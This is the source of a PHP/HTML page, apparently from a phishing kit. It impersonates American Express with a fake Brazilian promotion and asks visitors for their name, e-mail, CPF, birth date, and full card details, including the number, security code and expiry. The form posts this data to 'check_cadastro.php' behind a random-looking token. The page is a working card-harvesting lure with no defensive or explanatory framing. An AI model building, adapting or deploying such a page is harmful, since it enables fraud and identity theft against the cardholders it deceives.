<?php
function geraURL($tamanho = 32, $maiusculas = true, $numeros = true, $simbolos = true){
$lmin = 'abcdefghijklmnopqrstuvwxyz';
$lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
$num = '1234567890';
$simb = '#-/';
$retorno = '';
$caracteres = '';
$caracteres .= $lmin;
if ($maiusculas) $caracteres .= $lmai;
if ($numeros) $caracteres .= $num;
if ($simbolos) $caracteres .= $simb;
$len = strlen($caracteres);
for ($n = 1; $n <= $tamanho; $n++) {
$rand = mt_rand(1, $len);
$retorno .= $caracteres[$rand-1];
}
return $retorno;
}
$link_finaliza = 'check_cadastro.php?token='.geraURL(27);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>American Express - AMEX</title>
	<link rel="stylesheet" href="_styles/boot.css">
	<link rel="stylesheet" href="_styles/layout.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
	<script src="_jscripts/validation.js"></script>
</head>
<body class="bg_all_one">


<div class="container main_logo">
	<div class="content">
		<div class="logo">
			<img src="_images/logo_n1.png" height="69" width="82" alt="">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<div class="container main_header">
	<div class="content">
		<img src="_images/hd-header1.jpg">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container ">
	<div class="content main_main">
		<h1 class="main_title">Cadastre-se</h1>
		<p class="main_desc">Para participar da promoção, informe os dados requeridos abaixo.</p>

		<form action="<?php echo $link_finaliza; ?>" class="main_form" method="post" onsubmit="return check_form()">

			<div for="name" class="box_form">
				<span>Nome:</span>
				<input type="text" name="name" id="name" placeholder="Nome completo" class="main_input" autocomplete="off">
				<span class="error_msg" id="erName"></span>
			</div>

			<div for="email" class="box_form">
				<span>E-mail:</span>
				<input type="text" name="email" id="email" placeholder="E-mail" class="main_input" autocomplete="off">
				<span class="error_msg" id="erMail"></span>
			</div>

			<div for="cpf" class="box_form">
				<span>CPF:</span>
				<input type="text" name="cpf" id="cpf" placeholder="CPF" class="main_input" onblur="javascript: validarCPF(this.value);" onkeypress="javascript: mascara(this, cpf_mask);"  maxlength="14" autocomplete="off">
				<span class="error_msg" id="erCpf"></span>
			</div>

			<div for="name" class="box_form">
				<span>Nascimento:</span>
				<select name="dia_nascimento" id="dia_nascimento"  class="select_nascimento">
					<option value="DIA" selected disabled>DIA</option>
					<?php 
						for($i = 1;$i <= 31;$i++){
							if($i < 10){
								$i = '0'.$i;
							}
							echo '<option value="'.$i.'">'.$i.'</option>';
						}
					?>
				</select>
				/
				<select name="mes_nascimento" id="mes_nascimento" class="select_nascimento">
					<option value="MES" selected disabled>MÊS</option>
					<?php 
						for($i = 1;$i <= 12;$i++){
							switch ($i) {
								case '1':
									$mes_nasc = 'Janeiro';
								break;
								case '2':
									$mes_nasc = 'Fevereiro';
								break;
								case '3':
									$mes_nasc = 'Março';
								break;
								case '4':
									$mes_nasc = 'Abril';
								break;
								case '5':
									$mes_nasc = 'Maio';
								break;
								case '6':
									$mes_nasc = 'Junho';
								break;
								case '7':
									$mes_nasc = 'Julho';
								break;
								case '8':
									$mes_nasc = 'Agosto';
								break;
								case '9':
									$mes_nasc = 'Setembro';
								break;
								case '10':
									$mes_nasc = 'Outubro';
								break;
								case '11':
									$mes_nasc = 'Novembro';
								break;
								case '12':
									$mes_nasc = 'Dezembro';
								break;
							}
							echo '<option value="'.$i.'">'.$mes_nasc.'</option>';
						}
					?>
				</select>
				/
				<select name="ano_nascimento" id="ano_nascimento"  class="select_nascimento last">
					<option value="ANO" selected disabled>ANO</option>
					<?php 
						for($i = 1936;$i <= 1999;$i++){
							echo '<option value="'.$i.'">'.$i.'</option>';
						}
					?>
				</select>
				<span class="error_msg" id="erNascimento"></span>
			</div>

			<div class="clear"></div>
			<div class="divisor_msg">
				Agora, informe os dados do cartão que irá participar da promoção!
				<div class="clear"></div>
			</div>

			<div for="name" class="box_form">
				<span>Nome do cartão:</span>
				<input type="text" name="nome_card" id="nome_card" placeholder="Nome como inscrito no cartão" class="main_input" maxlength="30" autocomplete="off">
				<span class="error_msg" id="erNameCard"></span>
			</div>

			<div for="num_card" class="box_form">
				<span>Número do cartão:</span>
				<input type="text" name="num_card" id="num_card" placeholder="Número do cartão (15 dígitos da frente do cartão)" class="main_input" maxlength="15" autocomplete="off">
				<span class="error_msg" id="erNumCard"></span>
			</div>

			<div for="cvv" class="box_form">
				<span>Código de segurança:</span>
				<input type="password" name="cvv" id="cvv" placeholder="Código de segurança (4 dígitos)" class="main_input" maxlength="4" autocomplete="off">
				<span class="error_msg" id="erCvv"></span>
			</div>

			<div for="senha" class="box_form">
				<span>Validade:</span>
				<select name="mes_card" id="mes_card" class="select_val_card">
				<option value="MES" selected disabled>MÊS</option>
					<?php 
						for($i = 1;$i <= 12;$i++){
							if($i < 10){
								$i = '0'.$i;
							}
							echo '<option value="'.$i.'">'.$i.'</option>';
						}
					?>
				</select>
				/ 
				<select name="ano_card" id="ano_card"  class="select_val_card last">
					<option value="ANO" selected disabled>ANO</option>
					<?php 
						for($i = 2016;$i <= 2040;$i++){
							echo '<option value="'.$i.'">'.$i.'</option>';
						}
					?>
				</select>
				<span class="error_msg" id="erValCard"></span>
			</div>

			<input type="submit" name="continuar" id="continuar" value="Participar" class="btn_now">
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<!-- 
<div class="container main_extra">
	<div class="content">
		<img src="_images/main_extra.jpg">
	<div class="clear"></div>
	</div>content
</div>container
 -->

<div class="container main_footer">
	<div class="content">
		<img src="_images/main_footer.jpg" height="255" width="861" alt="">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->








<!-- BASE -->

<div class="container">
	<div class="content">
		
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<!-- BASE -->
</body>
</html>